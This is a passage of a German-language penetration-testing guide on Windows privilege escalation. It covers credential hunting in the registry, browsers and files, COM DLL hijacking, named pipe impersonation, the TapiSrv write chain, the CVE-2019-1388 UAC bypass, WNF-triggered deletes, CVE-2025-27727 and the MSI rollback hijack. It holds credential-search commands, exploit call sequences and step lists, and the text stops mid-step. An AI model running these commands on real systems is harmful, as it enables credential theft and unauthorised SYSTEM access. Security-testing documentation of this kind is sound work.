Sie sollten auch den Papierkorb nach darin gespeicherten Zugangsdaten durchsuchen.

Prüfen Sie zugängliche Einträge im Papierkorb auf gelöschte Backups und Konfigurationsarchive sowie auf Dateien, deren Namen ausdrücklich auf Zugangsdaten hinweisen. Ein nützliches `.7z`-, `.zip`- oder `.rar`-Backup kann Monate alt sein und einen gewöhnlichen Dateinamen haben. Windows speichert den ursprünglichen Pfad und den Löschzeitpunkt in einem `$I`-Datensatz und die gelöschte Datei als zugehörigen `$R`-Eintrag. Prüfen Sie die Metadaten und die Leseberechtigung der aktuellen Identität, bevor Sie ein Archiv öffnen. Die Sichtbarkeit hängt vom Volume, der Benutzer-SID und den Dateiberechtigungen ab. Eine leere Auflistung beweist daher nicht, dass kein wiederherstellbares Backup existiert. Betrachten Sie einen Archivnamen als Kandidaten für eine Überprüfung, nicht als Beweis dafür, dass er ein gültiges Geheimnis enthält.

Eine zugängliche gelöschte `.pfx`-Datei kann auch ein Hinweis auf **Code-Signierung** sein. Wenn sie einen zugänglichen privaten Schlüssel enthält, kann dieser ein geändertes PowerShell-Skript signieren; [PowerShell erfordert ein Code-Signierungszertifikat mit privatem Schlüssel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), und [AppLocker-Herausgeberregeln werten die Identität des Signierers und den Geltungsbereich der Regel aus](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Die Ausführung unter einem anderen Konto erfordert, dass die aktuelle Identität das konkrete Skript ändern kann, eine wirksame Regel die resultierende Signatur für das Skript und das Zielkonto akzeptiert und eine geplante Aufgabe oder ein anderer Prozess mit höheren Rechten das Skript tatsächlich ausführt. Ein `.pfx`-Dateiname, ein Zertifikatsbetreff oder ein beschreibbares Skript allein belegen diese Kette nicht. Prüfen Sie Metadaten, ACLs, Richtlinien und den geplanten Befehl, bevor Sie auf Material mit privaten Schlüsseln zugreifen oder die Aufgabe auslösen.

Prüfen Sie auch zugängliche Profildatenbanken von Messaging-Clients, Notizen und empfangene Dateien auf Hinweise auf Zugangsdaten. Ein BitLocker-Wiederherstellungsschlüsselexport kann als HTML- oder TXT-Datei gespeichert sein, mitunter in einem benannten Backup-Archiv. Solches Material kann Zugriff auf ein separates verschlüsseltes Daten-Volume ermöglichen, das ältere Backups enthält. Untersuchen Sie das Volume und das Archiv nur, wenn der Zugriff autorisiert ist. Enthält ein Backup `NTDS.dit`, ist für die Offline-Wiederherstellung von Domänenzugangsdaten außerdem der passende `SYSTEM`-Hive erforderlich, wie im [Workflow für Backups und privilegierte Gruppen](../active-directory-methodology/privileged-groups-and-token-privileges.md) beschrieben. Dateinamen und ein gesperrtes Volume allein belegen nicht, dass ein verwendbarer Wiederherstellungsschlüssel oder ein Domänen-Backup vorhanden ist.

Um in mehreren Programmen gespeicherte **Passwörter wiederherzustellen**, können Sie Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit Zugangsdaten**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**OpenSSH-Schlüssel aus der Registry extrahieren.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Du solltest nach Datenbanken suchen, in denen Passwörter von **Chrome oder Firefox** gespeichert sind.\
Du solltest nach Datenbanken suchen, in denen Passwörter von **Chrome, Edge oder Firefox** gespeichert sind.\
Prüfe auch den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise **Passwörter gespeichert sind**.

Für das standardmäßige Edge-Profil **Default** des aktuellen Benutzers befindet sich `Login Data` unter `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, während `Local State` im übergeordneten Verzeichnis `User Data` liegt. [Microsoft dokumentiert den Standardspeicherort des Profils](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ein anderes Profil oder eine `UserDataDir`-Richtlinie kann den Speicherort ändern. Das Vorhandensein der Dateien ist lediglich ein Hinweis auf einen möglichen Anmeldedatenspeicher: Prüfe, ob die Dateien lesbar sind, ob der DPAPI-Kontext des betreffenden Benutzers oder anderes autorisiertes Schlüsselmaterial verfügbar ist und ob ein gespeicherter Login zu einem privilegierteren Konto gehört. Eine reine Auflistung der Pfade muss weder die Datenbank öffnen noch entschlüsselte Passwörter ausgeben.

Für Firefox dokumentiert [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), dass `key4.db` und `logins.json` eines Profils die zusammengehörigen Schlüssel- und verschlüsselten Anmeldedateien sind. Ihr Vorhandensein ist lediglich ein Hinweis: Prüfe, ob beide Dateien lesbar sind, ob gespeicherte Einträge vorhanden sind und ob ein Primary Password den Schlüssel schützt, bevor du zu dem Schluss kommst, dass die Zugangsdaten verwendet werden können. Wenn eine wiederhergestellte Zugangsinformation zu einem Domänenkonto gehört, prüfe separat die effektiven Gruppensteuerungsrechte dieses Kontos und die [LAPS-Berechtigungen zum Lesen oder Entschlüsseln von Passwörtern](../active-directory-methodology/laps.md) der Gruppe; Browser-Artefakte allein belegen keinen möglichen Weg zu Administratorrechten.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine in das Windows-Betriebssystem integrierte Technologie, die die **Kommunikation** zwischen Softwarekomponenten ermöglicht, die in unterschiedlichen Sprachen geschrieben wurden. Jede COM-Komponente wird über eine Klassen-ID (CLSID) **identifiziert**, und jede Komponente stellt ihre Funktionalität über eine oder mehrere Schnittstellen bereit, die durch Schnittstellen-IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen sind in der Registry unter **HKEY\CLASSES\ROOT\CLSID** beziehungsweise **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Innerhalb der CLSIDs dieser Registry findest du den untergeordneten Registry-Schlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, dessen Einstellung **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (Thread-Neutral) sein kann.

![Browserverlauf – COM DLL Overwriting: Innerhalb der CLSIDs dieser Registry findest du den untergeordneten Registry-Schlüssel InProcServer32, der einen Standardwert enthält, der auf eine DLL verweist, sowie einen Wert...](<../../images/image (729).png>)

Wenn du also **eine der DLLs überschreiben** kannst, die ausgeführt werden, könntest du **deine Berechtigungen erweitern**, sofern diese DLL von einem anderen Benutzer ausgeführt wird.

Weitere Informationen dazu, wie Angreifer COM Hijacking als Persistenzmechanismus einsetzen, findest du hier:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Suche nach Passwörtern in Dateien und der Registry**

**Dateiinhalte durchsuchen**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Nach einer Datei mit einem bestimmten Dateinamen suchen**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Durchsuche die Registry nach Schlüsselnamen und Passwörtern**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf**-Plugin, das ich erstellt habe, um **automatisch jedes Metasploit-POST-Modul auszuführen, das im Opfer nach Zugangsdaten sucht**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die die auf dieser Seite erwähnten Passwörter enthalten.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System auszulesen.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sitzungen**, **Benutzernamen** und **Passwörtern** verschiedener Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Stell dir vor, **ein als SYSTEM ausgeführter Prozess öffnet einen neuen Prozess** (`OpenProcess()`) mit **vollständigem Zugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der alle geöffneten Handles des Hauptprozesses erbt**.\
Wenn du dann **vollständigen Zugriff auf den Prozess mit niedrigen Berechtigungen hast**, kannst du dir das **geöffnete Handle des mit `OpenProcess()` erstellten privilegierten Prozesses** holen und **Shellcode injizieren**.\
[In diesem Beispiel erfährst du mehr darüber, **wie sich diese Schwachstelle erkennen und ausnutzen lässt**.](leaked-handle-exploitation.md)\
[In **diesem anderen Beitrag** findest du eine ausführlichere Erklärung dazu, wie du weitere geöffnete Handles von Prozessen und Threads, die mit unterschiedlichen Berechtigungsstufen geerbt wurden (nicht nur mit vollständigem Zugriff), testen und missbrauchen kannst.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsam genutzte Speichersegmente, sogenannte **Pipes**, ermöglichen die Kommunikation und den Datentransfer zwischen Prozessen.

Windows bietet eine Funktion namens **Named Pipes**, über die nicht miteinander verbundene Prozesse Daten austauschen können, sogar über verschiedene Netzwerke hinweg. Das ähnelt einer Client/Server-Architektur mit den Rollen **Named-Pipe-Server** und **Named-Pipe-Client**.

Wenn ein **Client** Daten über eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, **die Identität des Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Wenn du einen **privilegierten Prozess** identifizierst, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet sich dir die Möglichkeit, **höhere Berechtigungen zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Mit dem folgenden Tool kannst du außerdem **eine Named-Pipe-Kommunikation mit einem Tool wie Burp abfangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **Mit diesem Tool kannst du alle Pipes auflisten und anzeigen, um Privescs zu finden:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv: Remote-DWORD-Schreibzugriff bis hin zu RCE

Der Telephony-Dienst (TapiSrv) stellt im Servermodus `\\pipe\\tapsrv` (MS-TRP) bereit. Ein entfernter, authentifizierter Client kann den auf Mailslots basierenden asynchronen Ereignispfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibzugriff** auf eine vorhandene Datei umzuwandeln, in die `NETWORK SERVICE` schreiben darf. Anschließend kann er Telephony-Administratorrechte erlangen und eine beliebige DLL als Dienst laden. Der vollständige Ablauf:

- `ClientAttach` mit `pszDomainUser`, das auf einen vorhandenen beschreibbaren Pfad gesetzt ist → der Dienst öffnet die Datei über `CreateFileW(..., OPEN_EXISTING)` und verwendet sie für asynchrone Ereignisschreibvorgänge.
- Jedes Ereignis schreibt den vom Angreifer kontrollierten `InitContext` aus `Initialize` in dieses Handle. Registriere eine Line-App mit `LRegisterRequestRecipient` (`Req_Func 61`), löse `TRequestMakeCall` (`Req_Func 121`) aus, rufe die Ereignisse über `GetAsyncEvents` (`Req_Func 0`) ab und hebe anschließend die Registrierung auf bzw. beende den Dienst, um die deterministischen Schreibvorgänge zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu, stelle die Verbindung wieder her und rufe dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Sonstiges

### Dateierweiterungen, die unter Windows Code ausführen können

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an.

### Missbrauch von Protokoll-Handlern / ShellExecute über Markdown-Renderer

An `ShellExecuteExW` weitergeleitete anklickbare Markdown-Links können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Befehlszeilen auf Passwörter überwachen**

Wenn du eine Shell als Benutzer erhältst, werden möglicherweise geplante Tasks oder andere Prozesse ausgeführt, die **Anmeldedaten in der Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen von Prozessen, vergleicht den aktuellen Zustand mit dem vorherigen und gibt alle Änderungen aus.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Passwörter aus Prozessen stehlen

## Vom Benutzer mit niedrigen Rechten zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn Sie Zugriff auf die grafische Benutzeroberfläche (über Konsole oder RDP) haben und UAC aktiviert ist, können Sie in einigen Versionen von Microsoft Windows als Benutzer ohne besondere Rechte ein Terminal oder einen anderen Prozess, beispielsweise als „NT\AUTHORITY SYSTEM“, ausführen.

Dadurch ist es möglich, mit derselben Schwachstelle gleichzeitig die Berechtigungen zu erweitern und UAC zu umgehen. Außerdem muss nichts installiert werden, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und herausgegeben.

Einige der betroffenen Systeme sind:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte ausgeführt werden:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Du hast alle erforderlichen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von Administrator mit mittlerem zu hohem Integrity Level / UAC-Bypass

Lies dies, um **Integrity Levels kennenzulernen**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lies anschließend dies, um **UAC und UAC-Bypasses kennenzulernen:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions im Upload-Verzeichnis in ein bereitgestelltes Stammverzeichnis

Eine Anwendung kann ein vorhersagbares Upload-Unterverzeichnis erstellen, einen vom Aufrufer angegebenen Dateinamen hineinschreiben und die Datei anschließend verarbeiten. Wenn ein Benutzer mit geringen Berechtigungen dieses Unterverzeichnis vor dem serverseitigen Schreibvorgang entfernen und durch eine NTFS-Junction ersetzen kann, kann der Schreibvorgang der Junction in ein über den Webserver bereitgestelltes Verzeichnis folgen. Ein dort abgelegtes Skript kann mit der Identität des Webdienstes ausgeführt werden, sofern der Server diesen Dateityp ausführt. Dies ist eine anwendungsspezifische Grenze für beliebige Schreibvorgänge; ein beschreibbares Upload-Verzeichnis oder eine vorhandene Junction allein beweist dies nicht.

Prüfe die genaue Pfadkonstruktion und den Zeitpunkt im Upload-Handler, die effektiven Lösch- und Erstellungsrechte des Benutzers für das Unterverzeichnis, die effektiven ACLs des Ziels, ob der Schreibvorgang Reparse Points folgt und ob der Webserver Dateien in diesem Zielverzeichnis ausführt. Ermittle die Prozessidentitäten des Schreibprozesses und des Webservers getrennt. Eine passive Bestandsaufnahme kann Verzeichnis-ACLs und Reparse-Metadaten anzeigen, aber weder das Verhalten des Handlers noch einen künftigen Junction-Austausch nachweisen. Wenn die Ausführung in einem Dienstkonto-Kontext erfolgt, prüfe den **tatsächlichen Prozesstoken**, bevor du einen separaten Weg über Token-Berechtigungen in Betracht ziehst.

## Durch WNF ausgelöste Bereinigung privilegierter geplanter Tasks

Ein geplanter Task, der eine manuelle Ausführung verweigert, kann dennoch einen Trigger offenlegen, der ohne erhöhte Berechtigungen nutzbar ist. Wenn du einen privilegierten Task prüfst, exportiere seine XML-Datei und untersuche **alle** Trigger sowie die DACL, den Principal und die Aktion des Tasks. Insbesondere benennt ein `WnfStateChangeTrigger` einen Windows Notification Facility (WNF)-Status. Wenn dieser absicherbare Status dem aktuellen Benutzer das Veröffentlichen einer Aktualisierung erlaubt, kann der Benutzer den Task indirekt mit der konfigurierten Identität starten, selbst wenn `<AllowStartOnDemand>false</AllowStartOnDemand>` gesetzt ist.<sup>[[43]](#references)</sup>

Beispielsweise wurde der Recall-Task `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` als SYSTEM ausgeführt, akzeptierte Aktualisierungen des WNF-Status `7508BCA32C079E41` von einem Standardbenutzer und untersuchte anschließend `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, selbst wenn Recall deaktiviert war.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Um die Erreichbarkeit zu testen, lösen Sie `ZwUpdateWnfStateData` aus `ntdll.dll` auf, übermitteln Sie ein leeres Update für den acht Byte langen Zustandsnamen und gleichen Sie den Rückgabestatus mit den Daten zum letzten Ausführen der Aufgabe oder den Procmon-Aktivitäten ab. Die folgende reduzierte Probe verwendet die Bytefolge aus dem Recall-Aufgabenbeispiel; ersetzen Sie sie durch die für die zu testende Aufgabe exportierten Bytes.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Rekursive Bereinigung in privilegiertes Löschen umwandeln

Die nützliche Primitive ist nicht allein der Trigger, sondern eine privilegierte Bereinigungsroutine, die ein vom Angreifer kontrolliertes Verzeichnis akzeptiert. Verfolgen Sie den Vorgang von der Enumeration bis zur abschließenden Änderung: Profilsitzungs-Erkennung, per Wildcard ausgewählte untergeordnete Elemente, `SHCreateItemFromParsingName` und `IFileOperation::DeleteItem` sind starke Hinweise darauf, dass ein zuvor überprüfter Pfad später rekursiv durchlaufen wird. Werden Nachfahren nicht relativ zu vertrauenswürdigen Verzeichnishandles geöffnet und vor dem Löschen validiert, kann ein Angreifer die Pfadauflösung zwischen Enumeration und Verwendung ändern.<sup>[[43]](#references)</sup>

Kombinieren Sie den WNF-Trigger mit der unten beschriebenen [oplock-, Junction- und Object-Manager-Symlink-Substitution](#from-folder-contents-delete-to-system-eop): Der oplock hält die Bereinigungsroutine an, nachdem sie das legitime untergeordnete Element ausgewählt hat. Währenddessen wird der beschreibbare übergeordnete Pfad ersetzt, sodass der fortgesetzte privilegierte Löschvorgang über `\RPC Control` auf das geschützte Ziel aufgelöst wird. In der Recall-Kette führte dies dazu, dass SYSTEM `C:\Config.Msi` löschte, was für die dokumentierte MSI-Rollback-Technik erforderlich war.<sup>[[31]](#references)[[43]](#references)</sup>

### Verschachtelte Nachfahren umgehen oberflächliche Reparse-Point-Korrekturen

Nur die vom Angreifer kontrollierte Stammstruktur und ihr unmittelbares untergeordnetes Element zu validieren, sichert einen rekursiven pfadbasierten Löschvorgang nicht ab. Lassen Sie diese überprüften Objekte unverändert und verlagern Sie die Junction-/oplock-Substitution in ein weiteres untergeordnetes Element darunter; `IFileOperation::DeleteItem` erreicht schließlich den nicht validierten Nachfahren und folgt dessen neuem Ziel. CVE-2026-20941 entstand genau durch diese Art unvollständiger Korrektur: Der erste Recall-Patch validierte `UKP` und das GUID-förmige Verzeichnis, behielt aber den alten rekursiven Löschvorgang bei.<sup>[[43]](#references)</sup>

Das sichere Muster besteht darin, **jeden Nachfahren** relativ zu einem bereits vertrauenswürdigen Verzeichnis-Handle zu öffnen, den endgültig aufgelösten Pfad bzw. das Objekt abzurufen und zu überprüfen und die Löschmarkierung auf dieses verifizierte Handle anzuwenden. Validieren Sie kein Präfix und wechseln Sie anschließend wieder zu einem rekursiven pfadbasierten Löschvorgang. Prüfen Sie bei der Überprüfung von Patches außerdem die Strukturen an der tatsächlichen Aufrufstelle: In diesem Fall zeigte die Laufzeitprüfung von `OBJECT_ATTRIBUTES` bei `NtCreateFile` ein nicht-null `RootDirectory` und einen relativen Namen `{GUID}\\secure_file.lock`. Damit wurde die irreführende Decompiler-Ausgabe widerlegt, die auf eine zweite `FILE_DELETE_ON_CLOSE`-Primitive hindeutete.<sup>[[43]](#references)</sup>

## Von beliebigem Ordnerlöschen/-verschieben/-umbenennen zu SYSTEM-EoP

Die Technik wird [**in diesem Blogbeitrag**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschrieben; ein Exploit-Code ist [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Bei dem Angriff wird im Wesentlichen die Rollback-Funktion des Windows Installers missbraucht, um während der Deinstallation legitime Dateien durch bösartige zu ersetzen. Dazu muss der Angreifer einen **bösartigen MSI-Installer** erstellen, der zum Hijacking des Ordners `C:\Config.Msi` verwendet wird. Der Windows Installer nutzt diesen später, um während der Deinstallation anderer MSI-Pakete Rollback-Dateien abzulegen, die so verändert wurden, dass sie die bösartige Payload enthalten.

### Injection in den Windows-Installer-COM-Bereinigungspfad (CVE-2025-27727)

Ein Benutzer mit niedrigen Berechtigungen kann über das COM-Objekt `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) den SYSTEM-Dienst `msiexec.exe` erreichen. Reverse Engineering identifizierte die relevanten `IMsiServer`-Aufrufe als `MsiBeginTransactionW` am vtable-Offset `0xA0`, `SetEEUIDirectoryAndFilter` bei `0xC8` und `CleanupTempPackages` bei `0x50`. Diese Namen und Offsets wurden durch Reverse Engineering ermittelt und können je nach Build variieren.<sup>[[41]](#references)</sup>

Bei einem Benutzer ohne Administratorrechte führt `SetEEUIDirectoryAndFilter` nur während des Öffnens des angegebenen Pfads mit `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` und `FILE_FLAG_OPEN_REPARSE_POINT` eine Identitätsübernahme des Aufrufers durch. Damit wird nachgewiesen, dass der Aufrufer das Verzeichnis löschen kann, und verhindert, dass einem Reparse Point gefolgt wird. Es wird jedoch **weder** das überprüfte Dateiobjekt an die spätere Bereinigung gebunden **noch** nachgewiesen, dass Windows Installer es erstellt hat.<sup>[[41]](#references)</sup>

Nach `MsiBeginTransactionW` registriert `SetEEUIDirectoryAndFilter` den Pfad unabhängig vom Filterargument des Aufrufers als Ordner. Der Dienst schreibt einen benannten `REG_DWORD`-Wert unter `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: Der Wertname ist der vom Aufrufer kontrollierte Pfad, und die Daten `0x00000002` kennzeichnen den Ordner. `CleanupTempPackages(NULL, FALSE)` startet anschließend direkt die Bereinigung. Der erhöhte Worker enumeriert die Registrierungswerte und übergibt Ordner-Einträge ohne Prüfung der Pfadherkunft an `FDeleteFolder`, das rekursiv löscht. Schlägt das normale Entfernen fehl, ruft der Code außerdem `LockdownPath` auf, löscht die Dateiattribute und versucht es erneut.<sup>[[41]](#references)</sup>

Die aus `msi.dll` rekonstruierte minimale Aufrufsequenz lautet:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Das nützliche Primitive ist die Wiederverwendung eines Pfads statt einer Junction-Umleitung. Registriere ein vom Angreifer erstelltes `C:\Config.Msi`, entferne es und lass Windows Installer später denselben Pfad mit geschützten Rollback-Daten neu erstellen. Die Bereinigung vertraut dem veralteten Namen `TempPackages` und löscht das neue Verzeichnis als SYSTEM. Damit wird die vorgesehene Grenze von `FILE_FLAG_OPEN_REPARSE_POINT` und der Mitigation für das Vertrauen in Umleitungen umgangen, da kein Reparse Point erforderlich ist.<sup>[[41]](#references)</sup>

Dieses Lösch-Primitive passt in die nachstehende Rollback-Kette: Bewahre den separaten `Installer\Folders`-Eintrag auf, lösche das geschützte `C:\Config.Msi`, erstelle es mit einer NULL-DACL neu und behalte ein Handle mit `WRITE_DAC`, bevor der Installer die DACL absichert. Mit dem vorab geöffneten Handle kann über `NtSetSecurityObject` eine permissive DACL wiederhergestellt werden. Danach lässt sich die erzeugte `.rbs` ersetzen, bevor das Rollback fortgesetzt wird.<sup>[[41]](#references)</sup>

Microsoft hat den Pfad abgesichert, indem verhindert wird, dass `CMsiTransaction::SetEEUIDirectoryAndFilter` `ScheduleFileOrFolderDelete` aufruft, wenn das neue Feature-Gate aktiviert ist. Der COM-Aufruf kann weiterhin Erfolg zurückgeben, aber der vom Angreifer kontrollierte Pfad wird nicht mehr in `TempPackages` eingetragen. Installiere die Windows-Sicherheitsupdates vom April 2025, statt einen erfolgreichen Methodenaufruf als Patch-Test zu verwenden.<sup>[[41]](#references)[[42]](#references)</sup>

Die zusammengefasste Technik sieht folgendermaßen aus:

1. **Phase 1 – Vorbereitung des Hijack ( `C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
    - Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
    - Kennzeichne den Installer als **„UAC Compliant“**, damit ein **Benutzer ohne Adminrechte** ihn ausführen kann.
    - Lass nach der Installation ein **Handle** für die Datei geöffnet.

- Schritt 2: Deinstallation starten
    - Deinstalliere dieselbe `.msi`.
    - Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
    - **Überwache das geöffnete Datei-Handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Benutzerdefinierte Synchronisierung
    - Die `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
        - signalisiert, sobald die `.rbf` geschrieben wurde.
        - Dann auf ein weiteres Ereignis **wartet**, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` verhindern
    - Öffne nach Erhalt des Signals die `.rbf`-Datei **ohne `FILE_SHARE_DELETE`** – dadurch wird **verhindert, dass sie gelöscht wird**.
    - Signalisiere anschließend zurück, damit die Deinstallation abgeschlossen werden kann.
    - Windows Installer kann die `.rbf` nicht löschen. Da er nicht alle Inhalte löschen kann, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
    - Lösche als Angreifer die `.rbf`-Datei manuell.
    - Jetzt ist **`C:\Config.Msi` leer** und bereit für den Hijack.

> Löse an diesem Punkt die SYSTEM-Level-Schwachstelle zum Löschen beliebiger Ordner aus, um `C:\Config.Msi` zu löschen.

2. **Phase 2 – Rollback-Skripte durch bösartige Skripte ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
